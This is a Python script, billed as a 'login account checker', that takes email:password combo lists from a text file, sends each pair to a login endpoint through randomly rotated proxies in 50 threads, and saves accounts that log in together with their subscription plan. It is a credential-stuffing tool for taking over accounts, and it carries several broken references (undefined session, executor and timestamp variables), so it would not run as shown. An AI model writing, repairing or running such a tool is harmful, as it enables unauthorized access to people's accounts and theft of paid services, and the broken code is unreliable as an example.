import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor

print('\033[92m'
    """.
        __                .__                .__                   __                 
       |  |   ____   ____ |__| ____     ____ |  |__   ____   ____ |  | __ ___________ 
       |  |  /  _ \ / ___\|  |/    \  _/ ___\|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \
       |  |_(  <_> ) /_/  >  |   |  \ \  \___|   Y  \  ___/\  \___|    <\  ___/|  | \/
       |____/\____/\___  /|__|___|  /  \___  >___|  /\___  >\___  >__|_ \\___  >__|   
                   /_____/         \/       \/     \/     \/     \/     \/    \/       
    
    """
'\033[0m')
print("==================================================================================")
print("""
        this tool helpful for web page login account checker and this tool have some username and passward payload file and file format given only txt file format """)


inurl = str(input(" given proxies server  url :"))
payloadpath = str(input(" payload path :"))
payloadfile = str(input("given payload file name :"))

class color:
    GREEN = '\033[92m'
    STOP = '\033[0m'
    RED='\033[31m'
    BLUE='\033[94m'
    BOLD = '\033[93m'
    
    
def safe(type,url, **kwarge):
    prourl = inurl
    r = requests.get(prourl).text.split()
    rdm = {"http":f"https://{random.choice(r)}"}
    while 1:
         try:
            req = session.request(type, url, proxies = rdm, timeout=5, **kwargs).json()
            break
         except:
            print(color.RED,'proxies error',color.STOP)
            pass
    return req

combo = open(f"{payloadpath + payloadfile}").read().split()

def check(combo):
    email = combo.split(":")[0]
    passward = combo.split(":")[1]
    url = " web url"
    data = { "username ": email, "password":passward}
    r= safe('post',url, json = data)
    if "ad_tags" in r:
        print(color.GREEN,f"[good] {email} :{passward} plan={r['plan_name']}",color.STOP)
        filewritting(email, passward,r['plan_name'])
    else:
        print(color.RED,f"[bad] {email} {passward}",color.STOP)
        
    
def filewritting(email,passward, account_type):
    open(f'Results\\[good hits] {x.strftime("%d-%m-%y %I-%M-%S-%P")}.txt', 'a').write(f'{email}:{passward} plan={account_type}')
 
       
def main():
    with ThreadPoolExecutor(max_workers=50) as Executor:
       futures = [executor.submit(check, combo) for combo in combos]
       executor.shutdown(wait=True)
       
       
if __name__ == '__main__':
    main()